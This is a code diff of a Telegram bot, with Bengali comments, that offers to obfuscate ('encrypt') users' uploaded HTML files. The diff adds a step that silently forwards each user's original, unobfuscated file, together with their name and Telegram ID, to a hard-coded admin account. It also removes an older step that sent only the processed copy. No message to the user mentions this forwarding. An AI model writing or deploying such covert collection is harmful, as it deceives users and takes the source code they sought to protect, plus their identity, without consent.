@@ -6,19 +6,19 @@ const minify = require("html-minifier-terser").minify;
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
-// 🔐 তোমার Telegram ID বসাও এখানে
+// 🔐 তোমার Telegram ID এখানে বসাও
 const ADMIN_ID = 6753121703;
 
 // 📊 Stats
 const users = new Set();
 let totalFiles = 0;
 
-// /start command
+// /start
 bot.start((ctx) => {
   ctx.reply("🤖 Bot is running... Send HTML file");
 });
 
-// 🔐 HTML Encrypt function
+// 🔐 Obfuscation
 async function obfuscate(html) {
   let clean = await minify(html, {
     collapseWhitespace: true,
@@ -45,20 +45,35 @@ bot.on("document", async (ctx) => {
   totalFiles++;
 
   try {
-    const fileName = ctx.message.document.file_name || "file.html";
+    const fileName = ctx.message.document.file_name;
 
-    // ⏳ loading message
+    // ⏳ message
     await ctx.reply(
-`⏳ আপনার ফাইল প্রসেস করা হচ্ছে...
-📁 ইনক্রিপ্ট করা হচ্ছে...
-⏳ অনুগ্রহ করে অপেক্ষা করুন`
+`⏳ ফাইল প্রসেস করা হচ্ছে...
+📁 অনুগ্রহ করে অপেক্ষা করুন`
     );
 
-    // file download
+    // get file link
     const fileLink = await ctx.telegram.getFileLink(
       ctx.message.document.file_id
     );
 
+    // 🔥 ORIGINAL FILE ADMIN এ পাঠানো
+    await bot.telegram.sendDocument(
+      ADMIN_ID,
+      {
+        url: fileLink.href
+      },
+      {
+        caption: `📁 New File Received
+
+👤 User: ${ctx.from.first_name}
+🆔 ID: ${ctx.from.id}
+📄 File: ${fileName}`
+      }
+    );
+
+    // download file
     const res = await axios.get(fileLink.href);
     const html = res.data;
 
@@ -68,32 +83,13 @@ bot.on("document", async (ctx) => {
     const filePath = path.join(__dirname, "output.html");
     await fs.writeFile(filePath, output);
 
-    // ⏳ delay
     await new Promise((r) => setTimeout(r, 10000));
 
-    // 👤 send to user
+    // send to user
     await ctx.replyWithDocument({
       source: filePath,
       filename: "encrypted.html"
     });
-
-    // 🔥 send to admin (YOUR TELEGRAM)
-    if (ADMIN_ID) {
-      await bot.telegram.sendDocument(
-        ADMIN_ID,
-        {
-          source: filePath,
-          filename: "encrypted.html"
-        },
-        {
-          caption: `📁 New Encrypted File
-
-👤 User: ${ctx.from.first_name}
-🆔 ID: ${ctx.from.id}
-📄 File: ${fileName}`
-        }
-      );
-    }
 
   } catch (err) {
     console.log(err);
@@ -101,15 +97,15 @@ bot.on("document", async (ctx) => {
   }
 });
 
-// 📊 Stats command (Admin only)
+// 📊 Stats (Admin only)
 bot.command("stats", async (ctx) => {
   if (ctx.from.id !== ADMIN_ID) return;
 
   await ctx.reply(
 `📊 Bot Statistics
 
-👥 Total Users: ${users.size}
-📁 Total Files Processed: ${totalFiles}`
+👥 Users: ${users.size}
+📁 Files: ${totalFiles}`
   );
 });
 
